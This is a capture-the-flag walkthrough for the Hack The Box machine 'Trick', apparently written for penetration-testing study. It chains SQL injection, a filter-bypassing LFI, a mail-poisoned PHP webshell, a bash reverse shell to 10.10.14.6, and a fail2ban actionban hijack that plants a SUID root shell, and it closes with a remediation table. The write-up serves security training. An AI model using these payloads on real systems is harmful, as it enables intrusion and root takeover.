# Trick — SQLi file read to mail-poisoned LFI and a fail2ban takeover

[![Difficulty](https://img.shields.io/badge/difficulty-Easy-green)](https://app.hackthebox.com/machines/trick)
[![OS](https://img.shields.io/badge/OS-Linux-blue)](https://app.hackthebox.com/machines/trick)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=ai98umjeO8M)

> **Attack path:** DNS zone transfer reveals `preprod-payroll.trick.htb` → SQLi auth bypass + boolean-blind SQLi (CVE-2022-28468) reads files → nginx config exposes `preprod-marketing.trick.htb` → filter-bypassed LFI (`....//`) runs as michael → SMTP mail poisoning turns the LFI into RCE (or just read michael's SSH key) → michael can restart fail2ban and belongs to the `security` group that owns `/etc/fail2ban/action.d` → hijacked `actionban` command runs as root → root shell.

## 1 · Reconnaissance

### Port scanning

```
# nmap -p- --min-rate 10000 10.10.11.166
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
53/tcp open  domain
80/tcp open  http

# nmap -p 22,25,53,80 -sCV 10.10.11.166
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
25/tcp open  smtp    Postfix smtpd  (VRFY supported)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7
80/tcp open  http    nginx 1.14.2
```

Four services, three of them useful: SMTP for user enumeration and
later mail poisoning, DNS for zone discovery, HTTP as the target.

### DNS and SMTP enumeration

Guess the domain, then request a zone transfer (TCP 53 being open is
the hint that this is intended):

```
# dig +noall +answer @10.10.11.166 axfr trick.htb
trick.htb.                   604800 IN A      127.0.0.1
preprod-payroll.trick.htb.   604800 IN CNAME  trick.htb.
```

Confirm users over SMTP (`252` = exists, `550` = unknown):

```
# telnet 10.10.11.166 25
VRFY michael
252 2.0.0 michael
```

Add both hosts to `/etc/hosts`:

```
10.10.11.166 trick.htb preprod-payroll.trick.htb
```

`trick.htb` itself is only a static "coming soon" page.

## 2 · Foothold

### SQL injection on preprod-payroll.trick.htb

The payroll app is "Payroll Management System" (Sourcecodetester). The
login is injectable (CVE-2022-28468) — a tautology bypass works:

```
username: 0xdf' or 1=1;-- -
password: anything
```

There is no direct output of query results, but the page differs for
true/false conditions, giving a boolean-blind injection. Save a login
request from Burp to `login.req` and hand it to sqlmap (force boolean
technique — the time-based default is far slower):

```
# sqlmap -r login.req --batch --technique B --level 5
# sqlmap -r login.req --batch --threads 10 --current-user
current user: 'remo@localhost'
# sqlmap -r login.req --batch --threads 10 -D payroll_db -T users --dump
| 1 | Administrator | SuperGucciRainbowCake | Enemigosss |
```

`SELECT ... INTO / file read` is also allowed — use it to pull server
files:

```
# sqlmap -r login.req --batch --threads 10 --file-read=/etc/nginx/sites-enabled/default
```

### A hidden subdomain

The nginx config lists three virtual hosts, including a new one:

```
server {
    server_name preprod-marketing.trick.htb;
    root /var/www/market;
    location ~ \.php$ {
        fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
    }
}
```

The dedicated `php7.3-fpm-michael.sock` hints this pool runs as
michael. (Fuzzing `Host: preprod-FUZZ.trick.htb` with wfuzz and
`--hh 5480` finds the same vhost without SQLi.)

### From LFI to code execution

The marketing site routes pages through `index.php?page=contact.html`.
Traversal and `php://filter` both fail; reading `index.php` via the
SQLi file read shows why:

```php
include("/var/www/market/".str_replace("../","",$_GET['page']));
```

`str_replace` runs once, so `....//` collapses into `../` after the
filter — a directory traversal:

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//etc/passwd
```

The include means any PHP in an included file executes, and port 25 is
open: mail michael a webshell (`/var/mail/michael` is cleared every
couple of minutes, so resend as needed):

```
# swaks --to michael --from 0xdf --header "Subject: test" \
    --body '<?php system($_REQUEST["cmd"]); ?>' --server 10.10.11.166
```

```
http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//var/mail/michael&cmd=id
uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)
```

(Alternatives: poison the nginx access log with a User-Agent webshell,
or simply include `....//....//....//....//home/michael/.ssh/id_rsa`
and copy the private key.)

### Shell

```
&cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'   # URL-encode in the browser
```

```
# nc -lnvp 443
michael@trick:/var/www/market$
```

## 3 · User flag

Upgrade the tty (`script /dev/null -c bash`, Ctrl-Z, `stty raw -echo; fg`)
and grab the flag; or authenticate with the leaked `id_rsa`
(`chmod 600` it first):

```
# ssh -i trick-michael michael@trick.htb
michael@trick:~$ cat user.txt
<flag>
```

## 4 · Privilege escalation

### Enumeration

```
michael@trick:~$ sudo -l
User michael may run the following commands on trick:
    (root) NOPASSWD: /etc/init.d/fail2ban restart

michael@trick:~$ id
groups=1001(michael),1002(security)

michael@trick:~$ find / -group security 2>/dev/null
/etc/fail2ban/action.d

michael@trick:~$ ls -ld /etc/fail2ban/action.d
drwxrwx--- 2 root security 4096 /etc/fail2ban/action.d/
```

michael can restart fail2ban as root and can write the action
configuration. In `/etc/fail2ban/jail.conf` the sshd jail uses the
default `banaction = iptables-multiport`, whose
`/etc/fail2ban/action.d/iptables-multiport.conf` defines the command
run on each ban:

```
actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
```

### Hijack actionban

Overwrite that line so a ban plants a SUID shell:

```
actionban = cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf
```

Restart the service and trip the SSH jail (maxretry=5 within findtime;
note bantime is only 10s, so fail fast and repeatedly):

```
michael@trick:~$ sudo /etc/init.d/fail2ban restart
# crackmapexec ssh trick.htb -u oxdf -p /usr/share/wordlists/rockyou.txt
```

The next ban executes the payload as root:

```
michael@trick:~$ ls -l /tmp/0xdf
-rwsrwxrwx 1 root root 1168776 /tmp/0xdf
```

## 5 · Root flag / Domain Admin

```
michael@trick:~$ /tmp/0xdf -p
0xdf-5.0# id
uid=1001(michael) gid=1001(michael) euid=0(root)

0xdf-5.0# cat /root/root.txt
<flag>
```

## 6 · Impact & remediation

| Risk | Impact | Remediation |
| --- | --- | --- |
| SQL injection in payroll login (CVE-2022-28468) | Auth bypass, full DB dump, arbitrary file read via sqlmap | Parameterized queries; never interpolate input into SQL; patch/replace vulnerable Sourcecodetester software |
| Misconfigured BIND allowing zone transfers | Internal vhost names disclosed to anyone | Restrict AXFR to designated secondaries |
| Weak traversal filter in `index.php` (`str_replace("../","",...)`) | LFI across the filesystem as michael | Canonicalize paths (realpath + prefix check); use an allowlist of pages |
| Local SMTP accepting mail for local users + PHP include | Mail-poisoned LFI becomes RCE | Disable the include of writable files; lock down mail for unauthenticated senders |
| fail2ban restart via sudo and writable action.d via `security` group | Config-injected command execution as root | Scope sudo away from service restarts; action configs must be root-only; never grant group write to fail2ban's config |

## 7 · CPTS takeaways

- Treat unusual open ports as features of the intended path: TCP 53 invites `dig axfr`, and port 25 pairs perfectly with PHP LFI (mail poisoning is a standard LFI-to-RCE upgrade — also know log poisoning).
- Boolean-blind SQLi workflow: confirm true/false response deltas by hand, then `sqlmap -r request --technique B` and use `--file-read` to pull configs (`/etc/nginx/sites-enabled/default` reveals hidden vhosts and per-user PHP-FPM pools).
- Bypass single-pass `str_replace` filters with `....//`; when a filter blocks `php://filter`, find another read primitive (here, the SQLi file read) to audit the source.
- Linux privesc is often a combination: `sudo -l` + odd group membership. Follow `find / -group <group> 2>/dev/null` to writable service configs — fail2ban's `actionban` executing as root is a known CPTS-style abuse.
- Watch timing parameters (bantime/findtime/maxretry) when triggering fail2ban-based execution — a 10-second ban window means your brute force has to be immediate.
